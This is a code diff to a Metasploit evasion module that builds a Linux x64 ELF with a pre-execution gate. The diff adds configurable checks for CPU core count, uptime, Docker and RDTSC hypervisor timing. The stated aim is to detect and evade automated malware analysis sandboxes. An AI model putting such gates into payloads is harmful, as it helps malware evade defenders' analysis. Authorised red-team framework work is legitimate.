@@ -14,9 +14,8 @@ class MetasploitModule < Msf::Evasion
         'Name' => 'Linux x64 Sandbox Environment Gate',
         'Description' => %q{
           Generates a Linux x64 ELF whose entry point is a pre-execution
-          environment gate. Checks /proc/cpuinfo (hypervisor flag),
-          /proc/1/cgroup (docker), /proc/self/status (TracerPid), and
-          /sys/class/dmi/id/sys_vendor (VM vendor string).
+          environment gate designed to detect and evade automated malware 
+          analysis sandboxes, hypervisors and containerized environments.
         },
         'Author' => ['Massimo Bertocchi'],
         'License' => MSF_LICENSE,
@@ -29,7 +28,11 @@ class MetasploitModule < Msf::Evasion
 
     register_options(
       [
-        OptString.new('FILENAME', [true, 'Output filename', 'env_gate.elf'])
+        OptString.new('FILENAME', [true, 'Output filename', 'env_gate.elf']),
+        OptInt.new('CORES', [true, 'Minimum CPU cores required to pass check', 2]),
+        OptInt.new('UPTIME', [true, 'Minimum system uptime in seconds required to pass check', 600]),
+        OptBool.new('CHECK_DOCKER', [true, 'Enable /.dockerenv container detection check', true]),
+        OptBool.new('CHECK_VIRT', [true, 'Enable RDTSC hypervisor latency detection (WARNING: Will kill payload on Cloud VMs)', false])
       ]
     )
   end
@@ -40,7 +43,7 @@ class MetasploitModule < Msf::Evasion
       fail_with(Failure::BadConfig, 'Failed to generate payload')
     end
 
-    gate_stub = sandbox_evasion
+    gate_stub = sandbox_evasion(datastore['CORES'], datastore['UPTIME'], datastore['CHECK_DOCKER'], datastore['CHECK_VIRT'])
     if gate_stub.blank?
       fail_with(Failure::BadConfig, 'Gate stub assembly failed')
     end
